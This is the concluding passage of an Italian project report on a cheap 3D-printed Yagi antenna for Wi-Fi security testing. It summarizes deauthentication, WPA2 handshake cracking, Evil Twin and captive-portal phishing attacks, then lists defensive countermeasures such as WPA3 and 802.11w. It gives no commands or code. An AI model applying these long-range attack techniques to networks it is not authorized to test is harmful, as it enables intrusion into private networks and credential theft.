- La scelta del PLA per il boom ha confermato la sua neutralità elettromagnetica: gli elementi risuonano esattamente sulle frequenze calcolate

**Validazione operativa:**
- La ricognizione passiva con `airodump-ng` ha permesso di identificare reti invisibili all'antenna standard (-85 dBm → -55 dBm con Yagi)
- L'attacco di deautenticazione ha dimostrato la vulnerabilità strutturale dei Management Frame 802.11 non cifrati
- Il cracking offline dell'handshake WPA2 ha confermato che le password deboli possono essere recuperate in secondi con hardware comune
- L'attacco Evil Twin ha evidenziato come il roaming automatico dei dispositivi Wi-Fi sia una superficie di attacco sfruttabile con hardware ad alto guadagno
- Il Captive Portal ha dimostrato che il Social Engineering può essere più efficace degli attacchi crittografici

### 7.2 Sinergia Multidisciplinare

La riuscita dell'esperimento conferma che la comprensione della **Radiotecnica** (SWR, impedenza, guadagno, lobi di radiazione) unita alla **Meccanica di precisione** (stampa 3D, calibro, tolleranze) e alla **Informatica** (protocolli 802.11, suite Aircrack-ng, gestione di rete Linux) è la chiave per padroneggiare — e difendere — i sistemi wireless moderni.

### 7.3 Implicazioni per la Difesa

Questo lavoro evidenzia le seguenti contromisure prioritarie:

| Vulnerabilità sfruttata | Contromisura efficace |
|------------------------|----------------------|
| Deauth attack (Management Frame non cifrati) | **802.11w** (Management Frame Protection) — obbligatorio con WPA3 |
| Cracking offline handshake WPA2 | **WPA3-SAE**: elimina gli handshake craccabili offline |
| Password deboli | Password di almeno 16 caratteri alfanumerici casuali |
| Evil Twin / Rogue AP | **802.11r** con autenticazione enterprise (WPA2-Enterprise / 802.1X) |
| DNS Hijacking / Captive Portal | **DoH** (DNS over HTTPS) e gestori di password con verifica URL |
| MITM su HTTP | **HTTPS ovunque** + **HSTS Preloading** |

### 7.4 Riflessione Finale

Un'antenna costruita con meno di 20€ di materiali (rame, PLA, connettore SMA) e una settimana di lavoro ha permesso di estendere il raggio di un attacco wireless da pochi decine di metri a **centinaia di metri**, rendendo l'attaccante completamente invisibile alla vittima. Questo non è un exploit software: è fisica applicata.

La lezione più importante di questo progetto non è tecnica, ma concettuale: **la sicurezza perimetrale di una rete wireless termina molto prima dei muri di un edificio**. Chiunque, con conoscenze di base di radiotecnica e strumenti economici, può raggiungere la rete Wi-Fi di un'abitazione da una distanza che nessun sistema di rilevamento fisico potrebbe monitorare. La migrazione verso **WPA3 con 802.11w** è oggi non un'opzione, ma una necessità.
